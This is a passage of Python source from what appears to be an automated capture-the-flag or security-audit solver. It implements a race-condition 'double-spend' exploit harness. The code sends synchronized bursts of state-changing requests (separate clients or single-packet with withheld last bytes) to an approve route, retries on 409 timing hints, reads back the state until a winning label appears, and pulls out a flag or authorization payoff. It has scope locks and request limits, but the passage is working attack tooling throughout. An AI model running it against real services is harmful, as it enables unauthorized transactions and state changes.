    except threading.BrokenBarrierError:
        pass
    for thread in threads:
        thread.join()
    return [r if r is not None else {"status": None, "body": b"", "headers": {}, "error": "no-result"}
            for r in results]


def race(*, transport, width, success, readback=None, state_of=race_state,
         retry_after_of=race_retry_after_ms, retries=0, clock=None, sleep=None,
         deadline=None, max_requests=None, stop=None, mode="separate"):
    """Drive a bounded sequence of synchronized bursts and report state transitions.

    ``transport(attempt)`` performs one burst and returns a list of normalized responses.
    ``readback()`` (optional) returns the authoritative post-burst state response; when given
    it -- not the burst responses -- decides ``success`` and the recorded state.  On a losing
    burst that carries a 409 ``retry_after_ms`` hint the loop waits (``sleep``) and re-bursts,
    up to ``retries`` extra attempts, honouring ``deadline``, ``max_requests`` and ``stop``.

    Returns ``(report, winning_response_or_None)``.  The report never contains request headers
    (so a bearer credential is never echoed).
    """
    clock = clock or time.time
    sleep = sleep or time.sleep
    retries = max(0, min(int(retries), RACE_MAX_RETRIES))
    transitions = []
    responses_by_attempt = []
    waited_ms = []
    prev_state = None
    stopped = None
    winner = None
    won = False
    attempt = 0
    requests_used = 0

    def _stopped_externally():
        return hasattr(stop, "is_set") and stop.is_set()

    while True:
        if _stopped_externally():
            stopped = "stopped"
            break
        if deadline is not None and (deadline - clock()) <= 0:
            stopped = "deadline"
            break
        need = width + (1 if readback is not None else 0)
        if max_requests is not None and requests_used + need > max_requests:
            stopped = "max_requests"
            break

        burst = list(transport(attempt))
        requests_used += width
        attempt += 1
        responses_by_attempt.append([
            {"status": r.get("status"), "error": r.get("error")} for r in burst])

        if readback is not None:
            authoritative = readback()
            requests_used += 1
        else:
            # No readback: the strongest burst response represents the state.
            authoritative = None
            for candidate in burst:
                if _status(candidate) == 200:
                    authoritative = candidate
                    break
            if authoritative is None:
                authoritative = burst[0] if burst else {"status": None, "body": b"", "headers": {}}

        state = state_of(authoritative)
        statuses = [r.get("status") for r in burst]
        two_hundreds = sum(1 for s in statuses if s == 200)
        transitions.append({
            "attempt": attempt, "from": prev_state, "to": state,
            "statuses": statuses, "ok_count": two_hundreds,
        })
        prev_state = state

        if success(state, burst, authoritative):
            won = True
            winner = authoritative
            break

        # Losing burst: look for a next-window hint across burst + readback.
        hint = None
        for candidate in list(burst) + ([authoritative] if authoritative is not None else []):
            if _status(candidate) == 409:
                hint = retry_after_of(candidate)
                if hint is not None:
                    break
        if hint is None or attempt > retries:
            stopped = stopped or ("no win within retries" if attempt > retries
                                  else "race lost; no retry hint")
            break
        if deadline is not None and (deadline - clock()) * 1000.0 <= hint:
            stopped = "deadline before next window"
            break
        waited_ms.append(hint)
        sleep(hint / 1000.0)

    report = {
        "mode": mode,
        "width": width,
        "attempts": attempt,
        "won": won,
        "final_state": prev_state,
        "transitions": transitions,
        "retry_waits_ms": waited_ms,
        "retries_used": len(waited_ms),
        "requests": requests_used,
        "responses": responses_by_attempt,
        "stopped": None if won else stopped,
    }
    return report, winner


def _build_burst_clients(client_factory, url, width, *, seed=None):
    """Build ``width`` distinct scope-locked clients from a caller factory.

    Tries ``factory(url, timeout)`` then ``factory(url)``.  When ``seed`` is given, any
    established cookie jar / reachability flag is carried into each clone so a credit/session
    cookie set by an earlier control is not lost (bearer-only targets simply ignore this)."""
    clients = []
    for _ in range(width):
        try:
            candidate = client_factory(url, REQUEST_TIMEOUT)
        except TypeError:
            candidate = client_factory(url)
        if seed is not None:
            if getattr(seed, "_reached", False) is True and hasattr(candidate, "_reached"):
                candidate._reached = True
            source = getattr(seed, "_jar", None)
            if source is not None:
                destination = getattr(candidate, "_jar", None)
                setter = getattr(destination, "set_cookie", None)
                if callable(setter):
                    for cookie in list(source):
                        setter(copy.copy(cookie))
        clients.append(candidate)
    if len({id(c) for c in clients}) != width:
        raise RaceUnsupported("client factory did not return distinct burst clients")
    return clients


def _plan_state_matches(response, success_state):
    """True when the authoritative readback reports the operator's target state."""
    if not isinstance(response, dict) or not success_state:
        return False
    wanted = str(success_state).strip().lower()
    body = _race_json(response)
    if isinstance(body, dict):
        for key in _RACE_STATE_KEYS:
            value = body.get(key)
            if isinstance(value, str) and value.strip().lower() == wanted:
                return True
    # Fall back to a word-boundary match in the readback text (e.g. an HTML status badge).
    text = _race_text(response).lower()
    return bool(re.search(r"(?<![a-z0-9_])" + re.escape(wanted) + r"(?![a-z0-9_])", text))


def _plan_payoff_text(response, flag_field):
    """The text a flag would live in: the named field if present, else the whole body."""
    body = _race_json(response)
    if flag_field and isinstance(body, dict):
        value = body.get(flag_field)
        if isinstance(value, str):
            return value[:MAX_TEXT]
    return _race_text(response)


def run_race_plan(client_factory, plan, *, clock=None, sleep=None):
    """Run one operator-supplied race plan against a scope-locked target and report.

    ``client_factory`` builds scope-locked clients for the one assigned target (the web lane's
    get_only guard must be OFF -- the burst is state-changing by design).  ``plan`` is the
    deterministic recipe the operator derived from a live ``GET /schema`` (no model needed):

        route           POST approve/confirm route (required)
        method          HTTP verb for the burst (default "POST")
        body            request body (default "{}")
        headers         request headers, e.g. {"Authorization": "Bearer ..."} (never logged)
        width           burst width (default 8, 1..64)
        mode            "separate" (default) or "single-packet"
        withhold        single-packet last-byte count (default 1)
        retries         extra re-bursts on a 409 retry_after_ms hint (default 3)
        readback_route  GET route that reports the authoritative state (required)
        readback_method default "GET"
        success_state   the winning state label, e.g. "ARMED" (required)
        flag_field      optional body field the payoff lives in, e.g. "arming_authorization"
        deadline / max_requests / stop   optional bounds

    Returns ``{"report", "won", "state", "stopped", "payoff_text", "payoff_field", "error"}``.
    Never raises for a recoverable problem: a bad plan or unsupported mode comes back with
    ``won=False`` and ``error`` naming the reason.  Never submits anything.
    """
    plan = dict(plan or {})
    route = plan.get("route")
    readback_route = plan.get("readback_route")
    success_state = plan.get("success_state")
    url = plan.get("url") or plan.get("base_url")
    missing = [name for name, value in (("route", route), ("readback_route", readback_route),
                                        ("success_state", success_state)) if not value]
    if missing:
        return {"report": None, "won": False, "state": None,
                "stopped": f"plan missing: {', '.join(missing)}", "payoff_text": "",
                "payoff_field": plan.get("flag_field"), "error": "incomplete plan"}
    if not callable(client_factory):
        return {"report": None, "won": False, "state": None, "stopped": "no client factory",
                "payoff_text": "", "payoff_field": plan.get("flag_field"),
                "error": "no client factory"}
    try:
        width = race_width(plan.get("width"))
    except ValueError as exc:
        return {"report": None, "won": False, "state": None, "stopped": str(exc),
                "payoff_text": "", "payoff_field": plan.get("flag_field"), "error": str(exc)}

    method = str(plan.get("method") or "POST").upper()
    body = plan.get("body", "{}")
    headers = plan.get("headers") or {}
    mode = str(plan.get("mode") or "separate").lower()
    withhold = int(plan.get("withhold") or 1)
    retries = int(plan.get("retries") if plan.get("retries") is not None else 3)
    readback_method = str(plan.get("readback_method") or "GET").upper()
    flag_field = plan.get("flag_field")

    # One long-lived lead client: readbacks run on it, and single-packet derives its scope from it.
    try:
        lead = client_factory(url, REQUEST_TIMEOUT)
    except TypeError:
        lead = client_factory(url)
    except Exception as exc:
        return {"report": None, "won": False, "state": None,
                "stopped": f"no scoped client: {type(exc).__name__}", "payoff_text": "",
                "payoff_field": flag_field, "error": "no scoped client"}
    if url is None:
        url = getattr(lead, "base", None)

    def readback():
        try:
            return _normalize_response(
                lead.request(readback_method, readback_route, allow_redirects=False))
        except Exception as exc:
            return {"status": None, "body": b"", "headers": {}, "error": type(exc).__name__}

    if mode == "single-packet":
        def transport(_attempt):
            return burst_single_packet(lead, method, route, width=width, body=body,
                                       headers=headers, withhold=withhold)
    elif mode == "separate":
        def transport(_attempt):
            clients = _build_burst_clients(client_factory, url, width, seed=lead)
            return burst_separate(clients, method, route, body=body, headers=headers)
    else:
        return {"report": None, "won": False, "state": None,
                "stopped": f"unknown race mode {mode!r}", "payoff_text": "",
                "payoff_field": flag_field, "error": "unknown mode"}

    def success(_state, _burst, authoritative):
        return _plan_state_matches(authoritative, success_state)

    try:
        report, winner = race(
            transport=transport, width=width, success=success, readback=readback,
            retries=retries, clock=clock, sleep=sleep, mode=mode,
            deadline=plan.get("deadline"), max_requests=plan.get("max_requests"),
            stop=plan.get("stop"))
    except RaceUnsupported as exc:
        return {"report": None, "won": False, "state": None, "stopped": str(exc),
                "payoff_text": "", "payoff_field": flag_field, "error": "unsupported mode"}

    payoff_text = _plan_payoff_text(winner, flag_field) if winner is not None else ""
    return {"report": report, "won": bool(report.get("won")),
            "state": report.get("final_state"), "stopped": report.get("stopped"),
            "payoff_text": payoff_text, "payoff_field": flag_field, "error": None}


def _surface(ctx, aid, values):
    evidence = ctx.get("evidence")
    for value in list(dict.fromkeys(str(x)[:MAX_CANDIDATE] for x in values))[:6]:
        line = _web.safe_display_text(
            f"WEB DOUBLE-SPEND CANDIDATE {aid}: {value} "
            f"(expected audit payoff; not auto-submitted)", 600)
        if isinstance(evidence, list) and line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises, retries, or submits."""
    ctx = dict(ctx or {})
    runner = _DoubleSpend(target, ctx)
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
        proof = None
    finally:
        runner.stop_now()
    aid = runner.target.get("answer_id") or "target"
    summary = runner.summary(proof)
    _surface(ctx, aid, summary.get("candidates") or [])
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "double_spend.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
